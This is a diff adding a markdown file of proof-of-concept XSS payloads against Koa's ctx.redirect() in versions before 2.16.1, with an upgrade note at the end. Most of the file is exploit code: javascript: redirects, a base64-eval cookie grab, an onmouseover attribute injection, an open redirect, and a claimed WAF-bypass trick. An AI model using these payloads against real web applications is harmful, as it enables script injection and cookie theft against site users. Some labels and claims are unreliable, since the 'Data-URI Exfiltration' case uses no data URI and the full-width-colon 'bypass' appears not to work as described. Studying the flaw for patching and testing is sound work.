@@ -1,0 +1,105 @@
+```md
+# Koa `ctx.redirect()` Reflected XSS – Exploitable Test Cases
+
+_All tests assume Koa < 2.16.1 (or any version < 2.16.1 / < 3.0.0-alpha.5) running on **localhost:3000**._
+
+---
+
+## Test Case 1 – Basic `javascript:` Scheme
+
+```js
+// server.js
+const Koa = require('koa');
+const app = new Koa();
+app.use(async ctx => ctx.redirect('javascript:alert(1)'));
+app.listen(3000);
+```
+
+**Trigger**
+
+```bash
+curl -i http://localhost:3000/
+```
+
+**Expected**
+
+```html
+Redirecting to <a href="javascript:alert(1)">javascript:alert(1)</a>.
+```
+
+---
+
+## Test Case 2 – Data-URI Exfiltration
+
+```js
+// server.js
+const Koa = require('koa');
+const app = new Koa();
+app.use(async ctx => {
+  const b64 = Buffer.from('alert(document.cookie)').toString('base64');
+  ctx.redirect(`javascript:eval(atob('${b64}'))`);
+});
+app.listen(3000);
+```
+
+**Trigger** – open `http://localhost:3000/` in a browser.
+
+---
+
+## Test Case 3 – Attribute-Breaking Injection
+
+```js
+// server.js
+const Koa = require('koa');
+const app = new Koa();
+const payload = 'javascript:alert(1);" onmouseover="alert(2)';
+app.use(async ctx => ctx.redirect(payload));
+app.listen(3000);
+```
+
+**Exploit** – hover the rendered link to fire `alert(2)`.
+
+---
+
+## Test Case 4 – Open-Redirect + XSS
+
+```js
+// server.js
+const Koa = require('koa');
+const app = new Koa();
+app.use(async ctx => {
+  const next = ctx.query.next || 'javascript:alert("pwn")';
+  ctx.redirect(next);
+});
+app.listen(3000);
+```
+
+**Malicious URL**
+
+```
+http://localhost:3000/?next=javascript:alert(document.domain)
+```
+
+---
+
+## Test Case 5 – Unicode Bypass for WAF Filters
+
+```js
+// server.js
+const Koa = require('koa');
+const app = new Koa();
+// full-width colon (U+FF1A) bypasses naïve filters
+app.use(async ctx => ctx.redirect('\uFF1Ajavascript:alert(1)'));
+app.listen(3000);
+```
+
+**Trigger** – open `http://localhost:3000/` to execute `alert(1)`.
+
+---
+
+> **Mitigation**  
+> Upgrade to **Koa 2.16.1** (stable) or **3.0.0-alpha.5** (next), where `ctx.redirect()` no longer emits an HTML anchor:  
+> ```bash
+> npm install koa@^2.16.1
+> ```
+```
